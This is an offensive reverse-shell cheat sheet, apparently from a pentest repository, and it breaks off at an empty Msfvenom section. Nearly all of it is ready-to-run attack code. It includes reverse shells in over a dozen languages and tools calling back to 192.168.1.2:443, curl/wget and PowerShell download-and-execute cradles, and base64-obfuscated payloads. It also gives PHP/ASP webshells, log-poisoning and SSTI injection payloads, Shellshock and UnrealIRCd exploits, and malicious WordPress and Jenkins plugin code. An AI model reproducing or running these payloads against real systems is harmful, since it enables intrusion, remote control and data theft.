# `Offensive Reverse Shell (Cheat Sheet)`

- [<kbd>Bash</kbd>](#bash)
  * [<kbd>Bash (URL Encode)</kbd>](#bash-url-encode)
- [<kbd>Netcat</kbd>](#netcat)
  * [<kbd>Netcat Linux</kbd>](#netcat-linux)
      * [<kbd>-e</kbd>](#-e)
      * [<kbd>-e (URL Encode)</kbd>](#-e-url-encode)
      * [<kbd>-c</kbd>](#-c)
      * [<kbd>-c (URL Encode)</kbd>](#-c-url-encode)
      * [<kbd>fifo</kbd>](#fifo)
      * [<kbd>fifo (URL Encode)</kbd>](#fifo-url-encode)
      * [<kbd>fifo (Base64)</kbd>](#fifo-url-encode)
  * [<kbd>Netcat Windows</kbd>](#netcat-windows)
- [<kbd>cURL</kbd>](#curl)
- [<kbd>Wget</kbd>](#wget)
- [<kbd>Node-RED</kbd>](#node-red)
- [<kbd>WebShell</kbd>](#webshell)
  * [<kbd>Exif Data</kbd>](#exif-data)
  * [<kbd>ASP WebShell</kbd>](#asp-webshell)
  * [<kbd>PHP WebShell</kbd>](#php-webShell)
  * [<kbd>Log Poisoning WebShell</kbd>](#log-poisoning-webshell)
      * [<kbd>SSH</kbd>](#log-poisoning-ssh)
      * [<kbd>FTP</kbd>](#log-poisoning-ftp)
      * [<kbd>HTTP</kbd>](#log-poisoning-http)
- [<kbd>Server Side Template Injection (SSTI)</kbd>](#server-side-template-injection)
- [<kbd>UnrealIRCd</kbd>](#unrealircd)
- [<kbd>Exif Data</kbd>](#exif-data-reverse-shell)
- [<kbd>Shellshock</kbd>](#shellshock)
  * [<kbd>SSH</kbd>](#shellshock-ssh)
  * [<kbd>HTTP</kbd>](#shellshock-http)
    * [<kbd>HTTP 500 Internal Server Error</kbd>](#shellshock-http-500-internal-server-error)
- [<kbd>CMS</kbd>](#cms)
  * [<kbd>WordPress</kbd>](#wordpress)
  * [<kbd>October</kbd>](#october)
  * [<kbd>Jenkins</kbd>](#jenkins)
    * [<kbd>Windows</kbd>](#jenkins-windows)
    * [<kbd>Linux</kbd>](#jenkins-linux)
- [<kbd>Perl</kbd>](#perl)
- [<kbd>Python</kbd>](#python)
- [<kbd>Python3</kbd>](#python3)
- [<kbd>PHP</kbd>](#php)
- [<kbd>Ruby</kbd>](#ruby)
- [<kbd>Xterm](#xterm)
- [<kbd>Ncat</kbd>](#ncat)
- [<kbd>Socat</kbd>](#socat)
- [<kbd>PowerShell</kbd>](#powershell)
- [<kbd>Awk</kbd>](#awk)
- [<kbd>Gawk</kbd>](#gawk)
- [<kbd>Golang</kbd>](#golang)
- [<kbd>Telnet</kbd>](#telnet)
- [<kbd>Java</kbd>](#java)
- [<kbd>Node</kbd>](#node)
- [<kbd>Msfvenom</kbd>](#msfvenom)
  * [<kbd>Web Payloads</kbd>](#web-payloads)
    * [<kbd>PHP</kbd>](#php-payload)
    * [<kbd>WAR</kbd>](#war-payload)
    * [<kbd>JAR</kbd>](#jar-payload)
    * [<kbd>JSP</kbd>](#jsp-payload)
    * [<kbd>ASPX</kbd>](#aspx-payload)
  * [<kbd>Linux Payloads</kbd>](#linux-payloads)
    * [<kbd>Listener Netcat</kbd>](#linux-listener-netcat)
    * [<kbd>Listener Metasploit Multi Handler</kbd>](#linux-listener-metasploit-multi-handler)
  * [<kbd>Windows Payloads</kbd>](#windows-payloads)
    * [<kbd>Listener Netcat</kbd>](#windows-listener-netcat)
    * [<kbd>Listener Metasploit Multi Handler</kbd>](#windows-listener-metasploit-multi-handler)

---

# <kbd>Bash</kbd>

# <kbd>TCP</kbd>

```cmd
bash -i >& /dev/tcp/192.168.1.2/443 0>&1
```
 
```cmd
bash -l > /dev/tcp/192.168.1.2/443 0<&1 2>&1
```

```cmd
sh -i 5<> /dev/tcp/192.168.1.2/443 0<&5 1>&5 2>&5
```

```cmd
bash -c "bash -i >& /dev/tcp/192.168.1.2/443 0>&1"
```

```cmd
0<&196;exec 196<>/dev/tcp/192.168.1.2/443; sh <&196 >&196 2>&196
```
 
```cmd
exec 5<>/dev/tcp/192.168.1.2/443;cat <&5 | while read line; do $line 2>&5 >&5; done
```

# <kbd>UDP</kbd>

```cmd
sh -i >& /dev/udp/192.168.1.2/443 0>&1
```

# <kbd>Bash URL Encode</kbd>

```cmd
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%22
```

---

# <kbd>Netcat</kbd>

# <kbd>Netcat Linux</kbd>

# <kbd>-e</kbd>

```cmd
nc -e /bin/sh 192.168.1.2 443
```

```cmd
nc -e /bin/bash 192.168.1.2 443
```

# <kbd>-e URL Encode</kbd>

```cmd
nc%20-e%20%2Fbin%2Fsh%20192.168.1.2%20443
```

```cmd
nc%20-e%20%2Fbin%2Fbash%20192.168.1.2%20443
```

# <kbd>-c</kbd>

```cmd
nc -c /bin/sh 192.168.1.2 443
```
 
```cmd
nc -c /bin/bash 192.168.1.2 443
```

# <kbd>-c URL Encode</kbd>

```cmd
nc%20-c%20%2Fbin%2Fsh%20192.168.1.2%20443
```

```cmd
nc%20-c%20%2Fbin%2Fbash%20192.168.1.2%20443
```

# <kbd>fifo</kbd>

```cmd
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f
```

# <kbd>fifo URL Encode</kbd>

```cmd
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.1.2%20443%20%3E%2Ftmp%2Ff
```

# <kbd>fifo Base64</kbd>

```cmd
root@kali:~# base64 -w 0 <<< 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f'
cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4xLjIgNDQzID4vdG1wL2YK
root@kali:~# nc -lvnp 443
```

```cmd
user@victim:$ echo 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4xLjIgNDQzID4vdG1wL2YK' |base64 -d |sh
```

```cmd
http://192.168.1.3/cmd.php?cmd=echo 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4xLjIgNDQzID4vdG1wL2YK' |base64 -d |sh
```

---

# <kbd>Netcat Windows</kbd>

```cmd
nc.exe -e cmd 192.168.1.2 443
```

```cmd
\\192.168.1.2\a\nc.exe -e cmd 192.168.1.2 443
```

---

# <kbd>cURL</kbd>

```cmd
root@kali:~# echo "nc -e /bin/sh 192.168.1.2 443" > index.html; python3 -m http.server 80
root@kali:~# nc -lvnp 443
```

```cmd
http://192.168.1.3/cmd.php?cmd=curl 192.168.1.2/index.html|sh
```

---

# <kbd>Wget</kbd>

```cmd
root@kali:~# echo "nc -e /bin/sh 192.168.1.2 443" > index.html; python3 -m http.server 80
root@kali:~# nc -lvnp 443
```

```cmd
http://192.168.1.3/cmd.php?cmd=wget -qO- 192.168.1.2/index.html|sh
```

---

# <kbd>Node-RED</kbd>

```json
[{"id":"7235b2e6.4cdb9c","type":"tab","label":"Flow 1"},{"id":"d03f1ac0.886c28","type":"tcp out","z":"7235b2e6.4cdb9c","host":"","port":"","beserver":"reply","base64":false,"end":false,"name":"","x":786,"y":350,"wires":[]},{"id":"c14a4b00.271d28","type":"tcp in","z":"7235b2e6.4cdb9c","name":"","server":"client","host":"192.168.1.2","port":"443","datamode":"stream","datatype":"buffer","newline":"","topic":"","base64":false,"x":281,"y":337,"wires":[["4750d7cd.3c6e88"]]},{"id":"4750d7cd.3c6e88","type":"exec","z":"7235b2e6.4cdb9c","command":"","addpay":true,"append":"","useSpawn":"false","timer":"","oldrc":false,"name":"","x":517,"y":362.5,"wires":[["d03f1ac0.886c28"],["d03f1ac0.886c28"],["d03f1ac0.886c28"]]}]
```

---

# <kbd>WebShell</kbd>

# <kbd>Exif Data</kbd>

```cmd
root@kali:~# exiftool -Comment='<?php system($_GET['cmd']); ?>' filename.png
root@kali:~# mv filename.png filename.php.png
```

# <kbd>ASP WebShell</kbd>

```asp
<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
```

# <kbd>PHP WebShell</kbd>

# <kbd>GET (Filter Chain)</kbd>

```php
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

# <kbd>GET</kbd>

```php
<?=`$_GET[cmd]`?>
```

```php
<?php system($_GET['cmd']); ?>
```

```php
<?php system($_REQUEST['cmd']); ?>
```

```php
<?php passthru($_GET['cmd']); ?>
```

```php
<?php echo exec($_GET['cmd']); ?>
```

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

# <kbd>Basic Proportions OK</kbd>

```php
<?php
  if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
  }
  ?>
```

```php
<?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
```

# <kbd>POST</kbd>

```php
<?php system($_POST['cmd']); ?>
```

---

# <kbd>Log Poisoning WebShell</kbd>

# <kbd>Log Poisoning SSH</kbd>

> /var/log/auth.log

```php
ssh '<?php system($_GET['cmd']); ?>'@192.168.1.2
```

> /var/log/auth.log&cmd=id

---

# <kbd>Log Poisoning FTP</kbd>

> /var/log/vsftpd.log

```cmd
root@kali:~# ftp 192.168.1.3
Connected to 192.168.1.3.
220 (vsFTPd 3.0.3)
Name (192.168.1.2:kali): <?php system($_GET['cmd']); ?>
331 Please specify the password.
Password: <?php system($_GET['cmd']); ?>
530 Login incorrect.
Login failed.
ftp>
```

> /var/log/vsftpd.log&cmd=id

---

# <kbd>Log Poisoning HTTP</kbd>

> /var/log/apache2/access.log
>
> /var/log/nginx/access.log

```cmd
curl -s -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://192.168.1.2"
```

```cmd
User-Agent: <?php system($_GET['cmd']); ?>
```

> /var/log/apache2/access.log&cmd=id
> 
> /var/log/nginx/access.log&cmd=id

---

# <kbd>Server Side Template Injection</kbd>

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('nc -e /bin/sh 192.168.1.2 443').read()}}
```
```python
{{''.__class__.__mro__[1].__subclasses__()[373]("bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'",shell=True,stdout=-1).communicate()[0].strip()}}
```
```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.2\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```
```python
{% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/192.168.1.2/443 0>&1"')}}
```
```python
%7B%25%20import%20os%20%25%7D%7B%7Bos.system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%22%27%29%7D%7D
```

---

# <kbd>UnrealIRCd</kbd>

```cmd
root@kali:~# echo "AB;nc -e /bin/sh 192.168.1.2 443" |nc 192.168.1.3 6697
```

---

# <kbd>Exif Data Reverse Shell</kbd>

```cmd
root@kali:~# exiftool -Comment='<?php system("nc -e /bin/bash 192.168.1.2 443"); ?>' filename.png
root@kali:~# mv filename.png filename.php.png
```

---

# <kbd>Shellshock</kbd>

# <kbd>Shellshock SSH</kbd>

```cmd
root@kali:~# ssh user@192.168.1.3 -i id_rsa '() { :;}; nc 192.168.1.2 443 -e /bin/bash'
```

---

# <kbd>Shellshock HTTP</kbd>

```cmd
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/192.168.1.2/443 0>&1' http://192.168.1.3/cgi-bin/test.sh
```
```cmd
curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.sh"
```
```cmd
curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.cgi"
```

---

# <kbd>Shellshock HTTP 500 Internal Server Error</kbd>

```cmd
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.sh"
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.sh"
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.cgi"
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.cgi"
```

---

# <kbd>CMS</kbd>

# <kbd>WordPress</kbd>

# <kbd>Plugin Reverse Shell</kbd>

```cmd
root@kali:~# nano plugin.php
```

```php
<?php
  /**
  * Plugin Name: Shelly
  * Plugin URI: http://localhost
  * Description: Love Shelly
  * Version: 1.0
  * Author: d4t4s3c
  * Author URI: https://github.com/d4t4s3c
  */

  exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'");
  ?>
```

```cmd
root@kali:~# zip plugin.zip plugin.php
```

* Plugins

* Add New

* Upload Plugin

* Install Now

* Activate Plugin

# <kbd>October</kbd>

```cmd
function onstart(){
  exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'");
}
```

---

# <kbd>Jenkins</kbd>

# <kbd>Jenkins Windows</kbd>

# <kbd>Netcat (Method 1)</kbd>

```cmd
cmd = "\\\\192.168.1.2\\a\\nc.exe -e cmd 192.168.1.2 443"
cmd.execute().text
```

# <kbd>Netcat (Method 2)</kbd>

```cmd
println "\\\\192.168.1.2\\a\\nc.exe -e cmd 192.168.1.2 443" .execute().text
```

# <kbd>CMD</kbd>

```cmd
String host="192.168.1.2";
int port=443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

# <kbd>PowerShell</kbd>

```cmd
command = "powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.2:8000/reverse.ps1')"
println(command.execute().text)
```

# <kbd>Jenkins Linux</kbd>

# <kbd>Bash</kbd>

```cmd
String host="192.168.1.2";
int port=443;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---

# <kbd>Perl</kbd>

```cmd
perl -e 'use Socket;$i="192.168.1.2";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

---

# <kbd>Python</kbd>

```cmd
export RHOST="192.168.1.2";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

```cmd
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

# <kbd>Python3</kbd>

```cmd
#!/usr/bin/python3

import os
import socket
import subprocess

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.1.2",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

```cmd
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

---

# <kbd>PHP</kbd>

```php
<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f"); ?>
```

```php
php -r '$sock=fsockopen("192.168.1.2",443);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("192.168.1.2",443);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.1.2",443);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.1.2",443);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.1.2",443);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
php -r '$sock=fsockopen("192.168.1.2",443);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.1.2",443);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

---

# <kbd>Ruby</kbd>

```cmd
ruby -rsocket -e'f=TCPSocket.open("192.168.1.2",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.1.2","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
ruby -rsocket -e 'c=TCPSocket.new("192.168.1.2","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

# <kbd>Xterm</kbd>

```cmd
xterm -display 192.168.1.2:443
```

---

# <kbd>Ncat</kbd>

# <kbd>TCP</kbd>

```cmd
ncat 192.168.1.2 443 -e /bin/sh
ncat 192.168.1.2 443 -e /bin/bash
```

# <kbd>UDP</kbd>

```cmd
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u 192.168.1.2 443 >/tmp/f
```

---

# <kbd>Socat</kbd>

```cmd
socat TCP:192.168.1.2:443 EXEC:sh
```
```cmd
socat TCP:192.168.1.2:443 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

---

# <kbd>PowerShell</kbd>

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.1.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.2',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.2:8000/reverse.ps1')
```
```powershell
C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.2/shell.ps1')
```
```powershell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.2/powercat.ps1');powercat -c 192.168.1.2 -p 443 -e cmd"
```

---

# <kbd>Awk</kbd>

```cmd
awk 'BEGIN {s = "/inet/tcp/0/192.168.1.2/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

---

# <kbd>Gawk</kbd>

```cmd
gawk 'BEGIN {P=443;S="> ";H="192.168.1.2";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'
```

---

# <kbd>Golang</kbd>

```cmd
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.1.2:443");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

---

# <kbd>Telnet</kbd>

```cmd
rm -f /tmp/p; mknod /tmp/p p && telnet 192.168.1.2 443 0/tmp/p
```
```cmd
telnet 192.168.1.2 80 | /bin/bash | telnet 192.168.1.2 443
```
```cmd
mknod a p && telnet 192.168.1.2 443 0<a | /bin/sh 1>a
```
```cmd
TF=$(mktemp -u);mkfifo $TF && telnet 192.168.1.2 443 0<$TF | sh 1>$TF
```

---

# <kbd>Java</kbd>

```cmd
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.1.2/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

---

# <kbd>Node</kbd>

```cmd
require('child_process').exec('bash -i >& /dev/tcp/192.168.1.2/443 0>&1');
```

---

# <kbd>Msfvenom</kbd>

# <kbd>Web Payloads</kbd>

# <kbd>PHP Payload</kbd>

```cmd
